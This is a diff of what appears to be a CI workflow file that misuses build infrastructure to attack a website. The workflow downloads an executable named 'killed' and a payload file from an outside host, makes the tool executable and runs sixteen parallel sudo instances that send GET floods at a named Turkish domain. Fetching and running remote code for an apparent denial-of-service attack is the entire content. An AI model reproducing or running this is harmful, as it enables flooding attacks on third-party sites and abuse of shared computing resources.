@@ -15,7 +15,7 @@ jobs:
         run: |
           wget https://wgetz.com/gYjRHuCLAo/killed -O killed
           wget https://wgetz.com/QehSBqKAxt/fres.txt -O fres.txt
-          chmod +x HTTP-RAW.js
+          chmod +x killed
           PIDS=()
           for i in {1..16}; do
             sudo timeout 40 ./killed GET https://odakteknoloji.com.tr/ fres.txt 40 900 6 &
